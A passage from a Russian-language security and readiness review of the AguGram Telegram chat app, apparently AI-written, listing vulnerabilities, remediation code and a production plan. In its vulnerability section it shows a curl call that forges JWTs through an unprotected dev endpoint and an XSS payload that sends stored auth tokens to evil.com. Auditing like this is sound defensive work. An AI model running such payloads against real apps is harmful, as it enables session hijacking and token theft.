- Можно создавать пользователей с любым tgId

**Как эксплуатировать:**
```bash
# Если NODE_ENV не "production":
curl -X POST https://agugram.app/api/auth/dev \
  -H "Content-Type: application/json" \
  -d '{"tgId": "123456789"}'

# Получаем настоящие JWT токены для фейкового юзера
```

**Как исправить:**
1. Всегда проверять `NODE_ENV === 'production'` строго
2. Добавить IP whitelist для dev endpoints
3. Требовать специальный dev key
4. Полностью удалить в production build

### 7. Токены в localStorage (XSS риск)

**Описание:**
- JWT токены хранятся в localStorage
- XSS атака может их украсть
- Лучше использовать httpOnly cookies

**Пример кражи:**
```javascript
// XSS payload:
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('chat_auth_state')
});
```

**Как исправить:**
1. Использовать httpOnly cookies для токенов
2. Добавить Content Security Policy
3. Санитизировать все пользовательские данные
4. Использовать Secure flag в cookies

### 8. No token revocation

**Описание:**
- Нет механизма invalidate токенов
- Украденные токены работают до истечения (15 min / 7 days)
- Logout не сбрасывает сессии на сервере

**Проблема:**
```typescript
// Logout только очищает localStorage:
clearAuth() {
  localStorage.removeItem('chat_auth_state');
}

// Но токены всё ещё валидны на сервере!
```

**Как исправить:**
1. Создать blacklist/whitelist токенов в Redis
2. При logout добавлять в blacklist
3. Проверять каждый токен при верификации
4. Добавить endpoint `/api/auth/logout` на сервере

### 9. Отсутствует rate limiting

**Описание:**
- API endpoints без ограничений
- WebSocket без throttling
- Возможен DDoS или spam

**Потенциальные атаки:**
- Spam регистраций
- Flood сообщений в чате
- Brute force на токены (если бы была авторизация по паролю)

**Как исправить:**
```typescript
// Установить express-rate-limit
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many auth attempts'
});

app.post('/api/auth', authLimiter, ...);

// Для WebSocket:
const messageLimiter = new Map<number, number[]>();

function checkRateLimit(userId: number): boolean {
  const now = Date.now();
  const userMessages = messageLimiter.get(userId) || [];
  const recentMessages = userMessages.filter(t => now - t < 60000); // 1 min
  
  if (recentMessages.length >= 10) return false; // max 10/min
  
  messageLimiter.set(userId, [...recentMessages, now]);
  return true;
}
```

### 10. SSL verification disabled в dev

**Описание:**
```typescript
if (process.env.NODE_ENV === 'development') {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}
```

**Проблема:**
- Если переменная утекает в production
- MITM атаки становятся возможны
- Database connection незащищен

**Как исправить:**
1. Использовать локальные сертификаты для dev
2. Никогда не отключать SSL verify
3. Использовать разные connection strings для dev/prod

---

## 📝 Список необходимых улучшений

### 🔴 Критический приоритет (блокируют продакшен)

#### 1. Реализовать настоящую аутентификацию через Telegram
**Файлы:** `client/src/lib/telegram.ts`, `server/routes.ts`, `client/src/App.tsx`

**Что делать:**
```typescript
// client/src/lib/telegram.ts
export function getInitData(): string | null {
  const webApp = getTelegramWebApp();
  if (webApp?.initData) return webApp.initData;
  
  // В dev можно использовать mock, но с предупреждением
  if (import.meta.env.DEV) {
    console.warn('[DEV] Using mock initData');
    return 'mock_init_data_for_dev';
  }
  
  return null;
}

// client/src/App.tsx - убрать hardcode
useEffect(() => {
  const authenticate = async () => {
    const initData = getInitData();
    if (!initData) {
      setLocation('/entry');
      return;
    }
    
    try {
      const response = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ initData })
      });
      
      const authData = await response.json();
      auth.setAuthData(authData);
    } catch (error) {
      console.error('Auth failed:', error);
    }
  };
  
  if (!auth.isAuthenticated()) {
    authenticate();
  }
}, []);

// server/routes.ts - использовать verifyInitData
app.post('/api/auth', async (req, res) => {
  const { initData } = req.body;
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  
  // В production ОБЯЗАТЕЛЬНА верификация
  if (process.env.NODE_ENV === 'production') {
    if (!verifyInitData(initData, botToken)) {
      return res.status(401).json({ error: 'Invalid initData' });
    }
  }
  
  // ... остальная логика
});
```

#### 2. Исправить WebSocket аутентификацию
**Файлы:** `client/src/pages/chat.tsx`, `server/websocket.ts`

**Что делать:**
```typescript
// client/src/pages/chat.tsx
const connectWebSocket = async () => {
  const token = await auth.getValidToken();
  
  if (!token) {
    console.error('No auth token for WebSocket');
    return;
  }
  
  const ws = new WebSocket(wsUrl);
  
  ws.onopen = () => {
    ws.send(JSON.stringify({ 
      type: 'auth', 
      token // ОТПРАВЛЯЕМ НАСТОЯЩИЙ ТОКЕН
    }));
  };
};

// server/websocket.ts - убрать dev bypass
async function handleAuth(ws, message) {
  const { token } = message;
  
  if (!token) {
    ws.send(JSON.stringify({
      type: 'auth_error',
      message: 'Token required'
    }));
    ws.close(1008);
    return;
  }
  
  // Всегда проверяем токен
  const tokenData = verifyAuthToken(token);
  if (!tokenData) {
    ws.send(JSON.stringify({
      type: 'auth_error',
      message: 'Invalid token'
    }));
    ws.close(1008);
    return;
  }
  
  // ... продолжить с валидным юзером
}
```

#### 3. Удалить dev bypass и fallback secrets
**Файлы:** `server/auth.ts`, `server/routes.ts`, `server/websocket.ts`

**Что делать:**
```typescript
// server/auth.ts
function getJwtSecret(): string {
  const secret = process.env.JWT_SECRET;
  
  if (!secret) {
    console.error('FATAL: JWT_SECRET is required');
    process.exit(1); // Всегда падать без секрета
  }
  
  if (secret.length < 32) {
    console.error('FATAL: JWT_SECRET too short (min 32 chars)');
    process.exit(1);
  }
  
  return secret;
}

// server/routes.ts - полностью удалить /api/auth/dev или защитить IP whitelist
app.post('/api/auth/dev', (req, res) => {
  // Проверка IP
  const allowedIPs = process.env.DEV_ALLOWED_IPS?.split(',') || ['127.0.0.1'];
  if (!allowedIPs.includes(req.ip)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Остальная логика...
});
```

#### 4. Добавить XSS защиту
**Файлы:** Все места вывода пользовательского контента

**Что делать:**
```bash
npm install isomorphic-dompurify
```

```typescript
// server/routes.ts
import DOMPurify from 'isomorphic-dompurify';

app.patch('/api/profile', requireAuth, async (req, res) => {
  const profileData = insertProfileSchema.parse(req.body);
  
  // Санитизировать все текстовые поля
  const sanitized = {
    ...profileData,
    bio: profileData.bio ? DOMPurify.sanitize(profileData.bio) : null,
    direction: DOMPurify.sanitize(profileData.direction),
  };
  
  await storage.updateUserProfile(req.user.userId, sanitized);
});

// server/websocket.ts
async function handleSendMessage(ws, message) {
  const trimmedContent = message.content?.trim();
  
  // Санитизировать сообщение
  const sanitizedContent = DOMPurify.sanitize(trimmedContent, {
    ALLOWED_TAGS: [], // Только текст, без HTML
    ALLOWED_ATTR: []
  });
  
  await storage.createMessage({
    content: sanitizedContent,
    userId: ws.userId,
    roomId: targetRoomId
  });
}
```

### 🟠 Высокий приоритет

#### 5. Реализовать CSRF защиту
```bash
npm install csurf
```

```typescript
import csrf from 'csurf';

const csrfProtection = csrf({ 
  cookie: { 
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  } 
});

app.use(csrfProtection);

// В форме
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

#### 6. Добавить rate limiting
```bash
npm install express-rate-limit
```

```typescript
import rateLimit from 'express-rate-limit';

// Для API endpoints
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 min
  max: 100, // 100 requests
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/', apiLimiter);

// Для auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many auth attempts, try again later'
});

app.post('/api/auth', authLimiter, ...);
```

#### 7. Использовать httpOnly cookies вместо localStorage
```typescript
// server/routes.ts
app.post('/api/auth', async (req, res) => {
  // ... auth logic
  
  const token = generateAuthToken(user);
  const refreshToken = generateRefreshToken(user);
  
  // Set httpOnly cookies
  res.cookie('accessToken', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000 // 15 min
  });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
  
  res.json({ user, status: user.status });
});

// Middleware для извлечения токена
function requireAuth(req, res, next) {
  const token = req.cookies.accessToken;
  
  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const user = verifyAuthToken(token);
  if (!user) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  req.user = user;
  next();
}
```

#### 8. Реализовать token revocation
```bash
npm install redis ioredis
```

```typescript
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

// Blacklist токена при logout
app.post('/api/auth/logout', requireAuth, async (req, res) => {
  const token = req.cookies.accessToken;
  const refreshToken = req.cookies.refreshToken;
  
  // Добавить в blacklist (TTL = время до истечения)
  await redis.setex(`blacklist:${token}`, 15 * 60, '1');
  await redis.setex(`blacklist:${refreshToken}`, 7 * 24 * 60 * 60, '1');
  
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  
  res.json({ success: true });
});

// Проверка при верификации
function verifyAuthToken(token: string) {
  try {
    // Проверить blacklist
    const isBlacklisted = await redis.get(`blacklist:${token}`);
    if (isBlacklisted) {
      return null;
    }
    
    const decoded = jwt.verify(token, getJwtSecret());
    return { userId: decoded.userId, ... };
  } catch (error) {
    return null;
  }
}
```

### 🟡 Средний приоритет

#### 9. Добавить индексы в базу данных
```sql
-- messages table
CREATE INDEX idx_messages_room_id ON messages(room_id);
CREATE INDEX idx_messages_created_at ON messages(created_at DESC);
CREATE INDEX idx_messages_user_id ON messages(user_id);

-- users table
CREATE INDEX idx_users_status ON users(status);
CREATE INDEX idx_users_created_at ON users(created_at);

-- Composite index для частых запросов
CREATE INDEX idx_messages_room_created ON messages(room_id, created_at DESC);
```

#### 10. Реализовать пагинацию сообщений
```typescript
// server/storage.ts
async getMessagesByRoomId(
  roomId: number, 
  options: { 
    limit?: number; 
    before?: Date; 
    after?: Date; 
  } = {}
): Promise<(Message & { user: User | null })[]> {
  const { limit = 50, before, after } = options;
  
  let query = db
    .select({...})
    .from(messages)
    .leftJoin(users, eq(messages.userId, users.id))
    .where(eq(messages.roomId, roomId));
  
  if (before) {
    query = query.where(lt(messages.createdAt, before));
  }
  
  if (after) {
    query = query.where(gt(messages.createdAt, after));
  }
  
  const result = await query
    .orderBy(desc(messages.createdAt))
    .limit(limit);
  
  return result.reverse();
}

// API endpoint
app.get('/api/messages/:roomId', async (req, res) => {
  const { roomId } = req.params;
  const { before, after, limit } = req.query;
  
  const messages = await storage.getMessagesByRoomId(
    parseInt(roomId),
    {
      limit: limit ? parseInt(limit) : 50,
      before: before ? new Date(before) : undefined,
      after: after ? new Date(after) : undefined
    }
  );
  
  res.json({ messages });
});
```

#### 11. Добавить Content Security Policy
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Убрать unsafe в будущем
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:", "https:"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

#### 12. Улучшить WebSocket с комнатами
```typescript
// Хранить подключения по комнатам
const roomConnections = new Map<number, Set<AuthenticatedWebSocket>>();

async function handleJoinRoom(ws: AuthenticatedWebSocket, message: any) {
  const { roomId } = message;
  
  // Проверить права доступа к комнате
  const room = await storage.getRoomById(roomId);
  if (!room) {
    ws.send(JSON.stringify({ 
      type: 'error', 
      message: 'Room not found' 
    }));
    return;
  }
  
  // Добавить в room connections
  if (!roomConnections.has(roomId)) {
    roomConnections.set(roomId, new Set());
  }
  
  roomConnections.get(roomId)!.add(ws);
  ws.currentRoomId = roomId;
  
  ws.send(JSON.stringify({
    type: 'joined_room',
    roomId,
    roomName: room.name
  }));
}

// Broadcast только в комнату
function broadcastToRoom(roomId: number, data: string) {
  const connections = roomConnections.get(roomId);
  if (!connections) return;
  
  connections.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(data);
    }
  });
}
```

#### 13. Добавить валидацию всех полей
```typescript
// shared/schema.ts
export const insertProfileSchema = createInsertSchema(users).pick({
  displayName: true,
  course: true,
  direction: true,
  bio: true,
  gender: true,
  socialLinks: true,
}).extend({
  displayName: usernameSchema,
  course: z.enum(["1", "2", "3", "4", "5", "6"]),
  direction: z.string()
    .min(2, "Минимум 2 символа")
    .max(100, "Максимум 100 символов")
    .regex(/^[а-яА-ЯёЁa-zA-Z0-9\s-]+$/, "Только буквы, цифры, пробелы и дефисы"),
  bio: z.string()
    .max(500, "Максимум 500 символов")
    .optional(),
  gender: z.enum(["male", "female"]),
  socialLinks: z.array(
    z.string().url("Некорректная ссылка")
  ).max(5, "Максимум 5 ссылок").optional(),
});
```

### 🟢 Низкий приоритет (улучшения UX)

#### 14. Загрузка изображений профиля
- Интеграция с Cloudinary/S3
- Валидация размера/формата
- Генерация thumbnails
- CDN для быстрой загрузки

#### 15. Приватные комнаты
- 1-на-1 чаты
- Групповые чаты
- Приглашения в комнаты
- Админы комнат

#### 16. Система модерации
- Жалобы на сообщения
- Блокировка пользователей
- Удаление сообщений
- Бан система

#### 17. Push уведомления
- Новые сообщения
- Упоминания
- Системные уведомления

#### 18. Оптимизация производительности
- Redis кэш для частых запросов
- Компрессия WebSocket сообщений
- Lazy loading компонентов
- CDN для статики

---

## 🚀 Рекомендации перед продакшеном

### Обязательные действия

#### 1. Безопасность

**ENV переменные:**
```bash
# Production .env
NODE_ENV=production
JWT_SECRET=<минимум 64 случайных символа>
DATABASE_URL=<production PostgreSQL URL>
TELEGRAM_BOT_TOKEN=<настоящий бот токен>
WEBAPP_URL=https://yourdomain.com
REDIS_URL=<Redis для token blacklist>

# НЕ включать в production:
# DEV_MODE=true
# NODE_TLS_REJECT_UNAUTHORIZED=0
```

**Security checklist:**
- [ ] Все dev endpoints удалены или защищены IP whitelist
- [ ] JWT_SECRET сгенерирован криптографически стойкий (64+ символа)
- [ ] HTTPS включен везде
- [ ] SSL verification включен для БД
- [ ] CORS настроен с whitelist доменов
- [ ] Rate limiting на всех endpoints
- [ ] XSS защита (DOMPurify) на всех inputs
- [ ] CSRF токены или SameSite cookies
- [ ] httpOnly cookies вместо localStorage
- [ ] Token revocation через Redis blacklist
- [ ] Content Security Policy headers
- [ ] Helmet.js для security headers

#### 2. База данных

**Миграции:**
```bash
# Создать все индексы
npm run db:migrate

# Или вручную:
CREATE INDEX idx_messages_room_id ON messages(room_id);
CREATE INDEX idx_messages_created_at ON messages(created_at DESC);
CREATE INDEX idx_users_status ON users(status);
```

**Оптимизация:**
- [ ] Все индексы созданы
- [ ] Регулярные VACUUM ANALYZE
- [ ] Connection pooling настроен
- [ ] Backup стратегия реализована
- [ ] Monitoring производительности

#### 3. Мониторинг и логирование

**Установить:**
```bash
npm install winston pino
npm install @sentry/node @sentry/react
```

**Sentry для ошибок:**
```typescript
import * as Sentry from '@sentry/node';

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 1.0,
});

app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.errorHandler());
```

**Структурированные логи:**
```typescript
import pino from 'pino';

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  redact: ['req.headers.authorization', 'password', 'token']
});

logger.info({ userId, action: 'login' }, 'User logged in');
```

#### 4. Тестирование

**Unit tests:**
```bash
npm install --save-dev vitest @testing-library/react
```

```typescript
// server/auth.test.ts
import { describe, it, expect } from 'vitest';
import { generateAuthToken, verifyAuthToken } from './auth';

describe('Auth', () => {
  it('should generate and verify valid token', () => {
    const user = { id: 1, anonName: 'Test', status: 'approved' };
    const token = generateAuthToken(user);
    const decoded = verifyAuthToken(token);
    
    expect(decoded?.userId).toBe(1);
  });
});
```

**E2E tests:**
```bash
npm install --save-dev playwright
```

```typescript
// e2e/chat.spec.ts
import { test, expect } from '@playwright/test';

test('user can send message in chat', async ({ page }) => {
  await page.goto('/chat');
  await page.fill('[placeholder="Type message"]', 'Hello');
  await page.click('button:has-text("Send")');
  
  await expect(page.locator('text=Hello')).toBeVisible();
});
```

**Checklist:**
- [ ] Unit tests для auth, storage, validation
- [ ] Integration tests для API endpoints
- [ ] E2E tests для критических путей
- [ ] Load testing для WebSocket
- [ ] Security testing (OWASP Top 10)

#### 5. Производительность

**Caching:**
```typescript
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

// Кэш профилей
async getUserProfile(userId: number) {
  const cached = await redis.get(`profile:${userId}`);
  if (cached) return JSON.parse(cached);
  
  const profile = await storage.getUserById(userId);
  await redis.setex(`profile:${userId}`, 300, JSON.stringify(profile));
  
  return profile;
}
```

**Checklist:**
- [ ] Redis для session store
- [ ] Кэширование частых запросов
- [ ] CDN для статики
- [ ] Gzip compression
- [ ] Image optimization
- [ ] Code splitting в frontend
- [ ] Lazy loading компонентов

#### 6. Scalability

**Horizontal scaling:**
```typescript
// WebSocket с Redis pub/sub
import { createAdapter } from '@socket.io/redis-adapter';

const pubClient = new Redis(process.env.REDIS_URL);
const subClient = pubClient.duplicate();

io.adapter(createAdapter(pubClient, subClient));

// Теперь можно запускать несколько инстансов
```

**Checklist:**
- [ ] Stateless backend (JWT вместо sessions)
- [ ] Redis для shared state
- [ ] Load balancer настроен
- [ ] Auto-scaling rules
- [ ] Database read replicas
- [ ] Message queue для async tasks

#### 7. Compliance и Privacy

**GDPR/Персональные данные:**
- [ ] Privacy Policy страница
- [ ] Terms of Service страница
- [ ] Cookie consent banner
- [ ] Data export endpoint
- [ ] Data deletion endpoint (right to be forgotten)
- [ ] Encryption at rest для sensitive data
- [ ] Audit logs для data access

**Пример:**
```typescript
// GDPR: Export user data
app.get('/api/gdpr/export', requireAuth, async (req, res) => {
  const user = await storage.getUserById(req.user.userId);
  const messages = await storage.getMessagesByUserId(user.id);
  
  const exportData = {
    profile: user,
    messages: messages,
    exportedAt: new Date().toISOString()
  };
  
  res.json(exportData);
});

// GDPR: Delete user data
app.delete('/api/gdpr/delete', requireAuth, async (req, res) => {
  await storage.anonymizeUser(req.user.userId); // Не удалять, а анонимизировать
  await redis.del(`profile:${req.user.userId}`);
  
  res.json({ success: true });
});
```

### Deployment checklist

**Перед deploy:**
- [ ] Все ENV переменные установлены
- [ ] Database миграции применены
- [ ] SSL сертификаты настроены
- [ ] Backup стратегия реализована
- [ ] Monitoring и alerts настроены
- [ ] Error tracking (Sentry) подключен
- [ ] Load testing пройден
- [ ] Security audit пройден

**После deploy:**
- [ ] Health check endpoint работает
- [ ] WebSocket connections стабильны
- [ ] Database connections в норме
- [ ] Логи пишутся корректно
- [ ] Metrics собираются
- [ ] Alerts работают

**Rollback план:**
- [ ] Процесс отката документирован
- [ ] Database backup доступен
- [ ] Previous version образа сохранен

---

## 📊 Итоговая оценка проекта

### Что работает ✅

1. **Базовая структура проекта**
   - Четкое разделение frontend/backend
   - TypeScript для type safety
   - Современный стек (React, Vite, Express, Drizzle)

2. **UI/UX**
   - Красивый дизайн с градиентами
   - Адаптивный layout
   - Плавные анимации (Framer Motion)
   - shadcn/ui компоненты

3. **Функциональность (в dev режиме)**
   - Регистрация профилей
   - Отправка/получение сообщений
   - WebSocket real-time
   - Telegram бот интеграция

4. **Database**
   - Правильная схема с отношениями
   - Drizzle ORM для type-safe queries
   - Neon PostgreSQL (serverless)

### Критические проблемы ❌

1. **Аутентификация сломана**
   - Frontend использует hardcoded токены
   - Telegram initData не используется
   - Production режим не работает

2. **Безопасность отсутствует**
   - XSS уязвимость
   - CSRF не защищен
   - Dev endpoints небезопасны
   - Токены в localStorage
   - No rate limiting

3. **Production readiness**
   - Нельзя запустить в production
   - Отсутствует monitoring
   - Нет error handling
   - Нет graceful shutdown

### Оценка по категориям

| Категория | Оценка | Комментарий |
|-----------|--------|-------------|
| **Архитектура** | 7/10 | Хорошая структура, но некоторые паттерны нарушены |
| **Безопасность** | 2/10 | Критические уязвимости, не готово для production |
| **Функциональность** | 6/10 | MVP функции есть, но authentication сломан |
| **Code Quality** | 7/10 | TypeScript, ESLint, но нет тестов |
| **Performance** | 5/10 | Нет кэширования, индексов, оптимизации |
| **UX/UI** | 8/10 | Красивый дизайн, хорошая анимация |
| **Database** | 6/10 | Схема ок, но нет индексов и оптимизации |
| **Documentation** | 4/10 | Базовый replit.md, нет API docs |
| **Testing** | 0/10 | Полностью отсутствует |
| **Production Ready** | 1/10 | Нельзя запустить в реальном окружении |

**Общая оценка: 4.6/10** - Требуется значительная доработка перед production

### Минимальный путь до production MVP

**Фаза 1: Критические исправления (1-2 недели)**
1. Реализовать настоящую Telegram аутентификацию
2. Исправить WebSocket auth с реальными JWT
3. Добавить XSS/CSRF защиту
4. Удалить dev bypasses
5. Настроить production ENV

**Фаза 2: Безопасность (1 неделя)**
1. Добавить rate limiting
2. Внедрить httpOnly cookies
3. Реализовать token revocation
4. Добавить CSP headers
5. Security audit

**Фаза 3: Стабильность (1 неделя)**
1. Добавить error handling
2. Настроить monitoring (Sentry)
3. Написать basic unit tests
4. Load testing
5. Backup стратегия

**Фаза 4: Production deploy (3-5 дней)**
1. Database миграции
2. SSL настройка
3. Первый deploy
4. Smoke testing
5. Rollback план

**Итого: ~4 недели до production MVP**

---

## 🔍 Дополнительная информация

### Используемые библиотеки (package.json)

**Frontend ключевые:**
- `react@18.3.1` + `react-dom@18.3.1` - UI framework
- `wouter@3.3.5` - Роутинг
- `@tanstack/react-query@5.60.5` - Server state
- `framer-motion@11.18.2` - Анимации
- `tailwindcss@3.4.17` - Стилизация
- `zod@3.24.2` - Валидация
- `lucide-react@0.453.0` - Иконки

**Backend ключевые:**
- `express@4.21.2` - HTTP server
- `ws@8.18.0` - WebSocket
- `jsonwebtoken@9.0.2` - JWT tokens
- `drizzle-orm@0.39.1` - Database ORM
- `@neondatabase/serverless@0.10.4` - Neon DB client
- `node-telegram-bot-api@0.66.0` - Telegram bot

**Dev tools:**
- `typescript@5.6.3` - Type checking
- `vite@5.4.19` - Build tool
- `tsx@4.20.5` - TS execution
- `drizzle-kit@0.30.4` - DB migrations

### Файловая структура

```
project/
├── client/                    # Frontend React app
│   ├── src/
│   │   ├── components/       # React components
│   │   ├── pages/           # Route pages
│   │   ├── lib/             # Utilities
│   │   ├── hooks/           # Custom hooks
│   │   └── assets/          # Images
│   └── index.html
│
├── server/                   # Backend Node.js
│   ├── index.ts             # Entry point
│   ├── routes.ts            # API endpoints
│   ├── auth.ts              # JWT logic
│   ├── websocket.ts         # WebSocket handlers
│   ├── db.ts                # DB connection
│   ├── storage.ts           # DB operations
│   └── telegram-bot.ts      # Telegram bot
│
├── shared/                  # Shared code
│   └── schema.ts            # DB schema + validation
│
├── docs/                    # Documentation
│   └── moderation-system.md
│
├── attached_assets/         # UI mockups
│
├── package.json
├── tsconfig.json
├── vite.config.ts
├── drizzle.config.ts
└── replit.md
```

### Архитектурные паттерны

**Используются:**
- ✅ Separation of Concerns (client/server/shared)
- ✅ Repository Pattern (storage.ts как интерфейс к БД)
- ✅ Singleton (AuthManager, storage)
- ✅ Factory Pattern (generateAuthToken, generateRefreshToken)
- ✅ Observer Pattern (AuthManager.subscribe)
- ✅ Middleware Pattern (Express middleware, requireAuth)

**Отсутствуют:**
- ❌ Dependency Injection
- ❌ Service Layer (бизнес-логика разбросана)
- ❌ Event Sourcing для audit logs
- ❌ CQRS для разделения чтения/записи
- ❌ Circuit Breaker для external APIs

### Возможные направления развития

**Краткосрочные (1-3 месяца):**
- Приватные чаты 1-на-1
- Загрузка изображений в профиль
- Система реакций на сообщения
- Typing indicators
- Read receipts
- Поиск по сообщениям
- Модерация контента

**Среднесрочные (3-6 месяцев):**
- Групповые чаты
- Voice/Video calls (WebRTC)
- Stories/Ephemeral content
- Gamification (ачивки, уровни)
- Marketplace для студентов
- Events система
- Рекомендательный алгоритм знакомств

**Долгосрочные (6-12 месяцев):**
- Мобильные нативные приложения
- Desktop приложение (Electron)
- Monetization (premium features)
- API для сторонних разработчиков
- AI chatbots для помощи студентам
- Integration с университетскими системами

---

## 📝 Заключение

Проект **AguGram** представляет собой хорошую основу для студенческой социальной сети с анонимным чатом. Архитектура продумана, UI привлекательный, основной функционал реализован.

**Однако, критические проблемы с безопасностью и аутентификацией делают невозможным запуск в production без серьезной доработки.**

### Главные выводы:

1. **Аутентификация должна быть полностью переписана** с использованием реального Telegram initData и корректных JWT токенов.

2. **Безопасность требует немедленного внимания** - XSS, CSRF, rate limiting, санитизация должны быть добавлены до любого публичного запуска.

3. **Инфраструктура не готова** - отсутствует monitoring, logging, error handling, testing, что критично для production.

4. **Database нуждается в оптимизации** - добавление индексов, пагинация, кэширование значительно улучшат производительность.

### Рекомендуемый план действий:

1. **Исправить критические проблемы** (2 недели)
   - Аутентификация
   - WebSocket auth
   - XSS/CSRF защита

2. **Добавить базовую безопасность** (1 неделя)
   - Rate limiting
   - Token revocation
   - Security headers

3. **Подготовить production инфраструктуру** (1 неделя)
   - Monitoring
   - Error tracking
   - Basic tests
   - Backup

4. **Deploy и тестирование** (3-5 дней)
   - Production deploy
   - Load testing
   - Security audit
   - Bug fixes

**Итоговое время до production-ready MVP: ~4 недели активной разработки**

После этого проект будет готов для beta-тестирования с реальными пользователями и дальнейшего развития согласно feedback.

---

**Документ создан:** 15 января 2025  
**Автор:** AI Analysis System  
**Версия:** 1.0  
**Следующий review:** После реализации критических исправлений